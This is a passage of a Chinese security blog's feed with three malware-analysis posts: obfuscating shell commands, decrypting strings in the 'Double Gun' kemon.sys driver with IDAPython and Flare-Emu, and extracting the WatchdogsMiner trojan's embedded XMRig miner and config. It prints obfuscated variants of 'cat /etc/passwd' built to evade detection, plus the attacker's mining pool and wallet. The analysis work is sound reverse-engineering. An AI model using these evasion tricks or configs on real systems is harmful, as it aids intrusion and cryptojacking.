      &lt;h2 id=&quot;缘由&quot;&gt;&lt;a href=&quot;#缘由&quot; class=&quot;headerlink&quot; title=&quot;缘由&quot;&gt;&lt;/a&gt;缘由&lt;/h2&gt;&lt;p&gt;攻防对抗中，JavaScript 和 Powershell 脚本的混淆见得很多，但经过混淆的 Shell 脚本见得相对少一些。其实，Shell 作为一种简易而灵活的编程语言，其脚本也完全可以做到像 JS/Powershell 那样的混淆。混淆一般是为了逃过自动化检测，也可以给人工分析增加难度。比如，针对 &lt;code&gt;cat /etc/passwd&lt;/code&gt; 这一条命令就可以用下面 3 种轻度混淆的方式来编写：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cat /et$&lt;span class=&quot;string&quot;&gt;&#39;c/pa\u0000/notexist/path&#39;&lt;/span&gt;sswd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;test&lt;/span&gt;=/ehhh/hmtc/pahhh/hmsswd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat &lt;span class=&quot;variable&quot;&gt;$&amp;#123;test//hh??hm/&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tmp_str=saudoihfnssoirtgn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat $(&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; /e)tc$(&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; /pa)&lt;span class=&quot;variable&quot;&gt;$&amp;#123;tmp_str:9:2&amp;#125;&lt;/span&gt;wd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="deobfuscation" scheme="http://jiayu0x.com/tags/deobfuscation/"/>
    
  </entry>
  
  <entry>
    <title>两种姿势批量解密恶意驱动中的上百条字串</title>
    <link href="http://jiayu0x.com/2019/03/17/two-ways-to-decrypt-cypher-str-in-malicious-driver/"/>
    <id>http://jiayu0x.com/2019/03/17/two-ways-to-decrypt-cypher-str-in-malicious-driver/</id>
    <published>2019-03-16T16:00:00.000Z</published>
    <updated>2019-03-21T09:58:30.201Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 360Netlab 的旧文 《<a href="https://mp.weixin.qq.com/s/KHa5GyCvbZwXruv0uK6weA" target="_blank" rel="external">“双枪”木马的基础设施更新及相应传播方式的分析</a>》 中，提到了 <strong>双枪</strong> 木马传播过程中的一个恶意驱动程序 <strong>kemon.sys</strong> ，其中有经过自定义加密的 Ascii 字符串和 Unicode 字符串 100+ 条（说是 <strong>编码</strong> 也行，毕竟不是很复杂的算法，这里就不掰扯加密跟编码的区别了）：</p>
<p><img src="/imgs/refer_content.jpg" alt=""></p>
<a id="more"></a>
<p>这在 <strong>双枪</strong> 木马的传播链条中只是一个很小的技术点，所以文中也没说具体是什么样的加密算法以及怎样解密，供分析员更方便地做样本分析工作。但这个技术点还算有点意思，尤其是对逆向入门阶段的朋友来说，可以参考一下解法。最近又碰到了这个驱动程序的最新变种，跟团队的老师傅讨教了一番，索性写篇短文记录一下。感谢老师傅们解惑(此处就不提名号了)。</p>
<p>也欢迎各路老师傅不吝赐教，提一些更快准狠的解法。</p>
<h2 id="2-样本概况"><a href="#2-样本概况" class="headerlink" title="2. 样本概况"></a>2. 样本概况</h2><blockquote>
<p>MD5： b001c32571dd72dc28fd4dba20027a88</p>
<p><strong>Note</strong>: 这是旧文中提到的旧样本，现在已经上传到 VT，想分析但下载不到的朋友可以留言，留下邮箱，我可以发到指定的邮箱。最新变种 VT 上暂时没有，我也不提供了。</p>
</blockquote>
<h3 id="2-1-字符串加密情况"><a href="#2-1-字符串加密情况" class="headerlink" title="2.1 字符串加密情况"></a>2.1 字符串加密情况</h3><p>驱动程序中用到的 100+ 条字符串都做了自定义加密处理，在设置完各 IRP 派遣函数和卸载例程之后，第一步操作就是依次解密这些字符串。IDA 中打开样本，部分解密过程如下：</p>
<p><img src="/imgs/decrypt_main_graph.png" alt=""></p>
<p>整个解密过程的函数是 <strong>sub_100038C4</strong> ，里面会多次调用两个具体的解密函数：<strong>sub10003871</strong> 和 <strong>sub_10003898</strong>，前者为解密 Ascii 字串，后者解密 Unicode 字串，都有两个参数：arg1–&gt;要解密的字符串地址；arg2–&gt;字符串长度。后面会把着两个函数分别命名为 <strong>DecryptAsciiStr</strong> 和 <strong>DecryptUnicodeStr</strong> 。这两个函数在 IDA 中看到的 xrefs 状况如下：</p>
<p><img src="/imgs/xref2decrypt_ascii.png" alt=""></p>
<p><img src="/imgs/xref2decrypt_unicode.png" alt=""></p>
<h3 id="2-2-加密算法"><a href="#2-2-加密算法" class="headerlink" title="2.2 加密算法"></a>2.2 加密算法</h3><p>前面说了，算法不复杂。以 <strong>DecryptAsciiStr</strong> 函数为例：</p>
<p><img src="/imgs/decrypt_ascii_graph.png" alt=""></p>
<p>反编译看看：</p>
<p><img src="/imgs/decrypt_ascii_decompiled.png" alt=""></p>
<p><strong>DecryptUnicodeStr</strong> 算法其实相同，只是因为字节构成不同，所以是两个解密函数分开写：</p>
<p><img src="/imgs/decrypt_unicode_decompiled.png" alt=""></p>
<p>简单总结起来，这套解密过程其实就是：把当前字节后面特定偏移处的字节与 0xC 异或，然后替换掉当前字节，把解密后的字节写入到当前位置，即完成解密。本人对密码学不熟，不知道这是不是已有名号的加密算法，看起来像是 <a href="https://en.wikipedia.org/wiki/Caesar_cipher" title="凯撒密码" target="_blank" rel="external">凯撒密码</a> 的变形加强版？对密码学有了解的朋友欢迎指教。 </p>
<h2 id="3-解密"><a href="#3-解密" class="headerlink" title="3. 解密"></a>3. 解密</h2><p>了解了上面的情况之后，就该着手解密这百十多条字符串了。既然是用 IDA 来分析这个样本，理想的状况应该是把这些字串批量解出来，直接在 IDA 中呈现，然后就可以进行后续分析了。既然是要自动化批量解密，写 IDAPython 应该算是最便捷的做法了。最终效果如图：</p>
<p><img src="/imgs/decrypted_status.png" alt=""></p>
<h3 id="3-1-姿势-1——自行实现解密算法"><a href="#3-1-姿势-1——自行实现解密算法" class="headerlink" title="3.1 姿势 1——自行实现解密算法"></a>3.1 姿势 1——自行实现解密算法</h3><p>首先想到的思路是：就两个解密算法，而且不复杂，不妨直接写个 IDAPython 脚本，实现这两个解密算法。解密之后把明文字串直接写到 IDB 文件中，在 IDA 中呈现。两个解密算法的 Python 版本分别如下(附带对 IDB 的 Patch 操作)：</p>
<p><img src="/imgs/decrypt_ascii_py.png" alt=""></p>
<p><img src="/imgs/decrypt_unicode_py.png" alt=""></p>
<p>这里稍微解释一下 <strong>make unicode str</strong> 时的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">old_type = idc.GetLongPrm(INF_STRTYPE)</div><div class="line">idc.SetLongPrm(idc.INF_STRTYPE, idc.ASCSTR_UNICODE)</div><div class="line">idc.MakeStr(argv[<span class="number">0</span>], argv[<span class="number">0</span>]+(argv[<span class="number">1</span>]*<span class="number">2</span>))</div><div class="line">idc.SetLongPrm(idc.INF_STRTYPE, old_type)</div></pre></td></tr></table></figure>
<p>在 IDA 的 UI 界面中，可以选择生成的字符串的类型(如下图)，快捷键只有一个 <strong>A</strong>，对应的 idc 函数是 <strong>idc.MakeStr(0</strong>。然而 <strong>ida.MakeStr()</strong> 函数默认是生成 Ascii 字串的，要想生成 Unicode 字串，就需要调用  <strong>idc.SetLongPrm()</strong> 函数设置一下字符串的类型。<img src="/imgs/makestr.png" alt="1552795108347"></p>
<p>IDA 中支持的字符串类型如上图，相应地，在 idc 库中的<a href="https://github.com/tmr232/idapython/blob/master/python/idc.py" title="idc lib" target="_blank" rel="external">定义</a>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ASCSTR_C       = idaapi.ASCSTR_TERMCHR # C-style ASCII string</div><div class="line">ASCSTR_PASCAL  = idaapi.ASCSTR_PASCAL  # Pascal-style ASCII string (length byte)</div><div class="line">ASCSTR_LEN2    = idaapi.ASCSTR_LEN2    # Pascal-style, length is 2 bytes</div><div class="line">ASCSTR_UNICODE = idaapi.ASCSTR_UNICODE # Unicode string</div><div class="line">ASCSTR_LEN4    = idaapi.ASCSTR_LEN4    # Pascal-style, length is 4 bytes</div><div class="line">ASCSTR_ULEN2   = idaapi.ASCSTR_ULEN2   # Pascal-style Unicode, length is 2 bytes</div><div class="line">ASCSTR_ULEN4   = idaapi.ASCSTR_ULEN4   # Pascal-style Unicode, length is 4 bytes</div><div class="line">ASCSTR_LAST    = idaapi.ASCSTR_LAST    # Last string type</div></pre></td></tr></table></figure>
<p>所以，要生成 Unicode 格式的字串，需要先用 <strong>idc.SetLongPrm()</strong> 函数设置一下字符串类型。其中 <strong>idc.INF_STRTYPE</strong> 即代表字符串类型的常量，在 idc 库中的<a href="https://github.com/tmr232/idapython/blob/master/python/idc.py" title="idc lib" target="_blank" rel="external">定义</a>如下：</p>
<p><img src="/imgs/INF_STRTYPE.png" alt=""></p>
<p>用 Python 实现了解密函数之后，如何模拟这一波解密过程把这 100+ 条字串依次解密呢？这里可以结合 IDA 中的 xrefs 和 <strong>idc.PrevHead()</strong> 函数来实现：</p>
<ol>
<li>先通过 xrefs 找到调用两个解密函数的位置；</li>
<li>再通过 <strong>idc.PrevHead()</strong> 定位到两个解密函数的参数地址，并解析出参数的值；</li>
<li>执行解密函数，将解密后的明文字串写回 IDB 并 MakeStr。</li>
</ol>
<h3 id="3-2-姿势-2——指令模拟"><a href="#3-2-姿势-2——指令模拟" class="headerlink" title="3.2 姿势 2——指令模拟"></a>3.2 姿势 2——指令模拟</h3><p>这个样本中的字串解密算法并不复杂，所以可以轻松写出 Python 版本，并直接用 IDAPython 脚本在 IDA 中将其批量解密。那如果字串解密算法比较复杂，用 Python 实现一版显得吃力呢？</p>
<p>这时不妨考虑一下指令模拟器。</p>
<p>近几年，<a href="https://unicorn-engine.org" title="Unicorn" target="_blank" rel="external">Unicorn</a> 作为新一代指令模拟器在业界大火。基于 Unicorn 的 IDA 指令模拟插件也不断被开发出来，比如简捷的 <a href="https://github.com/36hours/idaemu" title="IdaEmu" target="_blank" rel="external">IdaEmu</a> 和 FireEye 开发的功能强大的 <a href="https://github.com/fireeye/flare-emu" title="Flare-Emu" target="_blank" rel="external">Flare-Emu</a>。指令模拟器可以模拟执行一段汇编指令，而 IDA 中的指令模拟插件可以在 IDA 中模拟执行指定的指令片段(需要手动指定起始指令地址和结束指令地址，并设置相关寄存器的初始状态)。这样一来，我们就可以在 IDA 中，利用指令模拟插件来模拟执行上面的批量解密指令，解密字串的汇编指令模拟执行结束，字串也就自然都给解密了。</p>
<p>本文 Case 的指令模拟姿势基于 Flare-Emu。</p>
<p>不过，这个姿势需要注意两点问题：</p>
<ol>
<li>指令模拟器无法模拟系统 API ，如果解密函数中有调用系统 API 的操作，那指令模拟这个姿势就要费老劲了。</li>
<li>所谓模拟指令执行，真的只是<strong>模拟</strong>，而不会修改 IDA 中的任何数据。这样一来，需要自己把指令模拟器执行结束后的明文字串 Patch 到 IDB 文件中，这样才能在 IDA 中看到明文字串。</li>
</ol>
<h4 id="3-2-1-hook-api"><a href="#3-2-1-hook-api" class="headerlink" title="3.2.1 hook api"></a>3.2.1 hook api</h4><p>第 1 点问题，IdaEmu 中需要自己实现相关 API 的功能，并对指令片段中相应的 API 进行 Hook，才能顺利模拟。比如下图示例中，指令片段里调用了 <code>_printf</code> 函数，那么就需要我们手动实现 <code>_printf</code> 的功能并 Hook 掉指令片段中的 <code>_printf</code> 才行：</p>
<p><img src="/imgs/idaemu_call_hook.png" alt=""></p>
<p>而 Flare-Emu 就做的更方便了，他们直接在框架中实现了一些基础的系统 API，而不用自己手动实现并进行 Hook 操作：</p>
<p><img src="/imgs/flareemu_apihook.png" alt=""></p>
<p>之所以提这么个问题，是因为这个 kemon.sys 样本中的批量解密字串的过程中，涉及了对 <code>memcpy</code> 函数的调用：</p>
<p><img src="/imgs/decrypt_main_memcpy.png" alt=""></p>
<p>这样一来，直接用 Flare-Emu 来模拟执行应该是个更便捷的选项。</p>
<h4 id="3-2-2-Patch-IDB"><a href="#3-2-2-Patch-IDB" class="headerlink" title="3.2.2 Patch IDB"></a>3.2.2 Patch IDB</h4><p>第 2 点问题，将模拟结果写回 IDB 文件，在 IDA 中显示。</p>
<p>首要问题是如何获模拟执行成功后的结果——明文字符串。前面描述字串解密算法时说过，解密后的字节(Byte)会直接替换密文中的特定字节，把密文的前 <strong>dataLen</strong> 个字节解密出来，就是明文字串。这个字节替换的操作，其实对应 Unicorn 指令模拟器中定义的 <strong>MEM_WRITE</strong> 操作，即<strong>写内存</strong>，而且，字串解密过程中也只有这个字串替换操作会「写内存」。恰好，Flare-Emu 中提供了一个 <strong>memAccessHook()</strong> 接口(如下图)，可以 Hook 多种内存操作：</p>
<blockquote>
<p><strong>memAccessHook</strong> can be a function you define to be called whenever memory is accessed for reading or writing. It has the following prototype: <code>memAccessHook(unicornObject, accessType, memAccessAddress, memAccessSize, memValue, userData)</code>.</p>
</blockquote>
<p>Unicorn 支持 Hook 的的内存操作有<a href="https://github.com/unicorn-engine/unicorn/blob/master/bindings/python/unicorn/unicorn_const.py#L64" title="uc const" target="_blank" rel="external">以下几个</a>：</p>
<p><img src="/imgs/uc_mem_op.png" alt=""></p>
<p>于是，我们 Hook 掉指令模拟过程中的 <strong>UC_MEM_WRITE</strong> 操作，即可获取解密后的字节，并将这些字节手动 Patch 到 IDB 中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem_hook</span><span class="params">(unicornObject, accessType, memAccessAddress, memAccessSize, memValue, userData)</span>:</span></div><div class="line">    <span class="comment">#if accessType == UC.UC_MEM_READ:</span></div><div class="line">    <span class="comment">#    print("Read: ", hex(memAccessAddress), memAccessSize, hex(memValue))</span></div><div class="line">    <span class="keyword">if</span> accessType == UC.UC_MEM_WRITE:</div><div class="line">        <span class="comment">#print("Write: ", hex(memAccessAddress), memAccessSize, hex(memValue))</span></div><div class="line">        <span class="keyword">if</span> memAccessSize == <span class="number">1</span>:</div><div class="line">            idc.PatchByte(memAccessAddress, memValue)</div><div class="line">        <span class="keyword">elif</span> memAccessSize == <span class="number">2</span>:</div><div class="line">            idc.PatchWord(memAccessAddress, memValue)</div><div class="line">        <span class="keyword">elif</span> memAccessSize == <span class="number">4</span>:</div><div class="line">            idc.PatchDword(memAccessAddress, memValue)</div></pre></td></tr></table></figure>
<p>Patch IDB 的基本操作当然是像前文中 IDAPython 脚本那样，调用 <strong>idc.PatchXXX</strong> 函数写入 IDB 文件。前面第一个姿势中，Patch IDB 文件，只调用了一个 <strong>idc.PatchByte()</strong> 函数。其实，idc 库中共有 4 个函数可以 Patch IDB：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">idc.PatchByte(): Patch 1 Byte;</div><div class="line">idc.PatchWord(): Patch 2 Bytes;</div><div class="line">idc.PatchDword(): Patch 4 Bytes;</div><div class="line">idc.PatchQword(): Patch 8 Bytes;</div></pre></td></tr></table></figure>
<p>指令模拟器中执行 Patch 的操作，并不只有 <strong>PatchByte</strong> 这一项。根据我 print 出来的指令模拟过程中写内存操作的细节，可以看到共涉及 3 种 Patch 操作(如下图)：1 byte、2 Bytes 和 4 Bytes，所有才有了上面 <strong>mem_hook()</strong> 函数中的 3 种 <strong>memAccessSize</strong>。</p>
<p><img src="/imgs/decrypt_mem_size.png" alt=""></p>
<p>明确并解决了「系统 API Hook」和「捕获指令模拟结果并 Patch IDB」这两点问题，就可以写出准确无误的 IDAPython 脚本了。</p>
<h3 id="3-2-3-Radare2-ESIL-模拟"><a href="#3-2-3-Radare2-ESIL-模拟" class="headerlink" title="3.2.3 Radare2 ESIL 模拟"></a>3.2.3 Radare2 ESIL 模拟</h3><p>r2 上也有强大的指令模拟器，名为 <strong>ESIL</strong>( <a href="https://radare.gitbooks.io/radare2book/content/esil.html" target="_blank" rel="external">Evaluable Strings Intermediate Language</a>)：</p>
<p><img src="/imgs/r2_intro.png" alt=""></p>
<p>在 r2 上用这个东西来模拟指令解密这一批字符串，就不用像 IDA 中那样还要自己动手写 IDAPython 脚本了，只需要通过 r2 指令配置好几个相关参数即可。下面两张图是在 r2 中通过指令模拟批量解密这些字符串的前后对比：</p>
<p><img src="/imgs/r2_emu_origin.png" alt=""></p>
<p><img src="/imgs/r2_emu.png" alt=""></p>
<p>具体操作方法就不细说了，有兴趣的朋友可以自行探索。</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>文中介绍两种基本方法，在 IDA 中批量解密 <strong>双枪</strong> 木马传播中间环节的恶意驱动 kemon.sys 中的大量自定义加密字串：Python 实现解密函数和指令模拟解密函数。</p>
<p>原理都很简单，介绍的有点啰嗦，希望把每个关键细节都描述清楚了。</p>
<p>两种方法对应的 IDAPython 脚本，已上传到 Github，以供参考:</p>
<p><a href="https://github.com/0xjiayu/decrypt_CypherStr_kemonsys" target="_blank" rel="external">https://github.com/0xjiayu/decrypt_CypherStr_kemonsys</a></p>
<h2 id="5-参考资料："><a href="#5-参考资料：" class="headerlink" title="5. 参考资料："></a>5. 参考资料：</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1. 前言&quot;&gt;&lt;/a&gt;1. 前言&lt;/h2&gt;&lt;p&gt;在 360Netlab 的旧文 《&lt;a href=&quot;https://mp.weixin.qq.com/s/KHa5GyCvbZwXruv0uK6weA&quot;&gt;“双枪”木马的基础设施更新及相应传播方式的分析&lt;/a&gt;》 中，提到了 &lt;strong&gt;双枪&lt;/strong&gt; 木马传播过程中的一个恶意驱动程序 &lt;strong&gt;kemon.sys&lt;/strong&gt; ，其中有经过自定义加密的 Ascii 字符串和 Unicode 字符串 100+ 条（说是 &lt;strong&gt;编码&lt;/strong&gt; 也行，毕竟不是很复杂的算法，这里就不掰扯加密跟编码的区别了）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/refer_content.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="decrypt" scheme="http://jiayu0x.com/tags/decrypt/"/>
    
  </entry>
  
  <entry>
    <title>静态分析提取 WatchdogsMiner 木马中的矿机程序</title>
    <link href="http://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/"/>
    <id>http://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/</id>
    <published>2019-02-23T16:00:00.000Z</published>
    <updated>2019-03-21T06:37:35.367Z</updated>
    
    <content type="html"><![CDATA[<p>这周末爆发的新型 Linux 挖矿木马 WatchdogsMiner，有两家厂商分析的挺详细，尤其是腾讯云鼎实验室的分析，全面而深入。看完他们的的分析很有收获，也才发现这个 WatchdogsMiner 比之前想象的复杂一些：</p>
<ul>
<li>腾讯云鼎： <a href="https://mp.weixin.qq.com/s/3V0HVEREZWU8SkRWLspaxg" target="_blank" rel="external">事件分析 | Linux watchdogs 感染性隐藏挖矿病毒入侵还原录</a></li>
<li>深信服： <a href="https://mp.weixin.qq.com/s/dwY--BLzcyeXqPUZlhb__Q" target="_blank" rel="external">紧急预警！WatchDogsMiner挖矿蠕虫大量感染Linux服务器</a></li>
</ul>
<p>但是有一个参与此次木马应急响应的朋友指出：里面有个关键的挖矿模块 <code>/tmp/ksoftirqds</code> ，目前公开的分析文章中看他们并没有提到捕获的细节(当然，不是说他们没有搞定这一点，只是没在文中提及细节)。</p>
<p>说的也是，既然是<strong>挖矿木马</strong>，个人认为分析的时候要重点关注 3 个要素：</p>
<ol>
<li>矿机程序(Hash 值、由什么开源矿机编译而来、版本等等）；</li>
<li>挖矿配置（挖矿账号、矿池地址，有的还有自建挖矿代理服务器）；</li>
<li>挖矿收益（可选，因为在某些情况下查不到）。</li>
</ol>
<a id="more"></a>
<p>腾讯云鼎实验室的分析文章里给出了挖矿账号、矿池地址和挖矿收益信息，但关于挖矿程序信息并没有多说，文末也并没给出挖矿程序的 MD5。鄙人姑且一试，看能不能就这一点为公开的技术文章做一个小补充。</p>
<p>因为这个矿机程序在运行起来之后就被主样本删除了本地的执行体，并做了进程隐藏。一起探讨这个事件的朋友说，矿机程序可能需要动态分析的时候提取出来，或者做删除文件的还原操作，当然，也可以找到隐藏的挖矿进程把它从内存中 Dump 出来。挖矿账号和矿池地址在运行木马程序后抓包一般也能抓到……</p>
<p>周末白天出去浪，晚上回来大致看了一眼，发现用静态分析的方法，就可以从 Go 语言编写的 ELF 主木马样本中提取矿机程序和挖矿配置的文件。这里简单说一下思路。</p>
<p>以 WatchdogMiner 的 32bit 样本(UPX packed，MD5: <strong>aee3a19beb22527a1e0feac76344894c</strong> ，下文简称 <strong>主木马</strong>)为例来分析，这是一个 Go 语言编译来的 ELF 程序，其中有一批函数看起来 import 了 <code>github_con_hippies_LSD</code> 这个包：</p>
<p><img src="/imgs/watchdogs_funclist.png" alt=""></p>
<p>但是，我们如果去 Github 上找这一个 <code>hippies/LSD</code> 的 Go 语言包，会发现 <strong>Github 上根本没有这个包</strong>。以前有人讲过 Go 语言二进制的混淆技巧，其中之一就是修改 import 进来的 Go 语言包的名字，用来迷惑分析人员。这里可以猜测主样本用了这个混淆技巧，即：这个所谓的 <code>hippies/LSD</code> 包，是一个别的 Go 语言包，可能是木马作者自己开发的，也可能是网上公开的别的开源 Go 语言包(做这种混淆的话，一般都是针对开源 Go 语言包，因为如果被分析人员发现用了什么包，分析人员就可以直接去参考 Go 语言包的 Docs 或者源码，对逆向分析木马程序帮助很大)。</p>
<p>这一点很有意思，这是鄙人第一次见到这种情况的 Go 语言二进制文件，也是促使我稍微深入一探究竟的原因之一。</p>
<p>那么这个包在这个木马程序中有什么用？简单分析就知道，这个包<strong>在执行 <code>Go build</code> 命令来编译最终的二进制程序时，可以把程序用到的文件打包到最终的 EFL 文件中</strong>。具体到这个木马上来看，矿机程序 <strong>ksoftirqds</strong> 和矿机配置文件 <strong>config.json</strong> 其实都已经被以二进制数据的形式打包在了 ELF 格式的主木马文件中，并且在木马执行过程中释放出来。</p>
<p>于是我们就可以看看，能不能直接静态逆向，在 IDA 中直接把矿机程序文件和矿机配置文件从主木马中提取出来。</p>
<p>我们不能准确知道这个 Go 语言包是什么，但好在它并不复杂，直接在 IDA 里就能分析出来关键函数的实现逻辑。这个 Go 语言包的主要的作用是<strong>把要打包的文件用 GZip 格式压缩，然后打包进 ELF 文件中</strong>。</p>
<p>WatchdogMiner 的主木马中，有一个 <code>github_com_hippies_LSD_LSDB__ksoftirqds32Bytes</code> 函数，该函数的核心逻辑如下：</p>
<p><img src="/imgs/watchdogs_addr_length.png" alt=""></p>
<p>上图已经标出： <code>addr_ptr</code> (off_851FAC8 )就是 GZip 压缩后的 <code>ksoftirqds</code> 文件地址的指针(指针值是 <code>byte_84A3580</code> ，即最终的 GZip 文件地址)，下面的参数即为 Gzip 文件 <code>length</code> 地址(length: 0x7BCE6)。</p>
<p>然后，在随后调用的函数 <code>github_com_hippies_LSD_LSDC_Read</code> 我们可以看到对 <code>compress/gzip/NewReader</code> 的调用，这里就确定了我们前面提到的结论：这个 <code>hippies/LSD</code> 包的主要作用是：GZip 压缩文件、把压缩后的文件编译打包进 ELF 主木马中：</p>
<p><img src="/imgs/watchdogs_gzip_decompress.png" alt=""></p>
<p>查看 GZip 数据地址 <code>byte_84A3580</code> 的内容，就可以看到前两个字节 <code>1F8Bh</code> ，即为 GZip 格式的文件头标志：</p>
<p><img src="/imgs/watchdogs_gzip_flag.png" alt=""></p>
<p> 上面是矿机程序的情况，矿机配置文件 <code>config.json</code> 的情况也一毛一样。OK，明白了原理，再从主木马程序文件中提取矿机程序和矿机配置文件就很 Easy 了：</p>
<ol>
<li>在 IDA 中先找到他们的 GZip 压缩数据的 addr 和 length；</li>
<li>在 IDA 中把这一段数据 dump 出来；</li>
<li>用 GZip 解压 dump 出来的二进制数据，Over。</li>
</ol>
<p><strong>结论</strong></p>
<p>我从 WatchdogMiner 的 32bit 样本(MD5: <strong>aee3a19beb22527a1e0feac76344894c</strong> )  中提取出来的矿机程序也加了 UPX 壳，脱壳后发现是由 <strong>XMRig2.8.0 RC</strong>  编译而来；矿机配置文件 <code>config.json</code> 没加壳。IDA 中打开矿机程序截图如下：</p>
<p><img src="/imgs/watchdogs_miner_info.png" alt=""></p>
<p>配置文件的内容如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"algo"</span>: <span class="string">"cryptonight"</span>,</div><div class="line">    <span class="attr">"api"</span>: &#123;</div><div class="line">        <span class="attr">"port"</span>: <span class="number">0</span>,</div><div class="line">        <span class="attr">"access-token"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"id"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"worker-id"</span>: <span class="literal">null</span>,</div><div class="line">        <span class="attr">"ipv6"</span>: <span class="literal">false</span>,</div><div class="line">        <span class="attr">"restricted"</span>: <span class="literal">true</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"asm"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"autosave"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"av"</span>: <span class="number">0</span>,</div><div class="line">    <span class="attr">"background"</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">"colors"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"cpu-affinity"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"cpu-priority"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"donate-level"</span>: <span class="number">0</span>,</div><div class="line">    <span class="attr">"huge-pages"</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">"hw-aes"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"log-file"</span>: <span class="literal">null</span>,</div><div class="line">    <span class="attr">"max-cpu-usage"</span>: <span class="number">100</span>,</div><div class="line">    <span class="attr">"pools"</span>: [</div><div class="line">        &#123;</div><div class="line">            <span class="attr">"url"</span>: <span class="string">"stratum+tcp://xmr.f2pool.com:13531"</span>,</div><div class="line">            <span class="attr">"user"</span>: <span class="string">"46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.teny"</span>,</div><div class="line">            <span class="attr">"pass"</span>: <span class="string">"x"</span>,</div><div class="line">            <span class="attr">"rig-id"</span>: <span class="literal">null</span>,</div><div class="line">            <span class="attr">"nicehash"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"keepalive"</span>: <span class="literal">false</span>,</div><div class="line">            <span class="attr">"variant"</span>: <span 